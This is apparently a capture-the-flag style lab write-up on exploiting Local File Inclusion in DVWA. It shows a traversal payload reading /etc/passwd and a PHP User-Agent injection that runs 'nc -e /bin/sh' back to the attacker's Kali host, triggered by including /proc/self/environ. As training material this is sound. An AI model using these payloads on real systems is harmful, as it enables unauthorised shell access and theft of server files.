Local File Inclusion (LFI) Exploitation – DVWA Lab

In this lab, we exploit a **Local File Inclusion (LFI)** vulnerability using a technique called **directory traversal** to access sensitive files on the server and eventually gain a reverse shell.

---

  1. Understanding the Vulnerable Parameter

We navigate to the file inclusion page in **Damn Vulnerable Web Application (DVWA)**:

```
http://172.16.219.181/dvwa/vulnerabilities/fi/?page=include.php
```

* The `page` parameter is used to dynamically load files.
* This indicates a potential LFI vulnerability.

To verify if the file exists, we modify the URL:

```
http://172.16.219.181/dvwa/vulnerabilities/fi/include.php
```

* The server reveals the full path:

  ```
  /var/www/dvwa/vulnerabilities/fi/include.php
  ```
* From this, we understand the directory structure and count the levels.

---

  2. Exploiting Directory Traversal

We attempt to access sensitive system files using directory traversal:

```
?page=../../../../../etc/passwd
```

Full URL:

```
http://172.16.219.181/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
```

* `../` moves up one directory level
* Repeating it allows us to reach the root directory
* `/etc/passwd` is a critical Linux file containing user information

 If successful, the contents of `/etc/passwd` are displayed, confirming LFI.

<img width="1440" height="576" alt="Screenshot 2026-05-02 at 9 44 44 PM" src="https://github.com/user-attachments/assets/75d762d6-3c64-4623-bbe8-71d21105c129" />


---

  3. Moving from File Read → Code Execution

Reading files is useful, but the real goal is **remote code execution**.

We use a special file:

```
/proc/self/environ
```

  Why `/proc/self/environ`?

* It stores **environment variables** of the current process
* Includes HTTP headers such as:

  * `User-Agent`
  * Other request headers

---

  4. Injecting Malicious Code

Using **Burp Suite**, we intercept the request and modify the **User-Agent** header.

Instead of normal text, we inject PHP code:

```php
<?php passthru("nc -e /bin/sh <Kali-IP> 4444"); ?>
```

* This payload executes a reverse shell using **Netcat**

<img width="1440" height="590" alt="Screenshot 2026-05-02 at 10 41 04 PM" src="https://github.com/user-attachments/assets/39c0bfcf-ffc7-4a8a-bc3b-81e09cb0f89f" />

<img width="1090" height="314" alt="Screenshot 2026-05-02 at 10 43 25 PM" src="https://github.com/user-attachments/assets/1cfa053f-d1d0-4156-a7eb-94bc4c1a2dbd" />

---

  5. Triggering Code Execution

1. Start a listener on Kali Linux:

   ```
   nc -lnvp 4444
   ```

2. Use LFI to include the injected file:

   ```
   ?page=/proc/self/environ
   ```

* The server loads this file
* Our injected PHP code gets executed
* A reverse shell connection is sent to Kali

---

  6. Result

* We gain **remote shell access** to the target machine
* This confirms full exploitation of the LFI vulnerability

<img width="1440" height="349" alt="Screenshot 2026-05-02 at 10 40 42 PM" src="https://github.com/user-attachments/assets/737fbfcb-3512-4135-9f46-b1f9731d698a" />


---

🔥 Key Takeaways

* LFI allows **reading local files**
* Directory traversal (`../`) is used to navigate the filesystem
* `/etc/passwd` is commonly used to confirm LFI
* `/proc/self/environ` can be abused for **code execution**
* Combining LFI + header injection = **reverse shell**

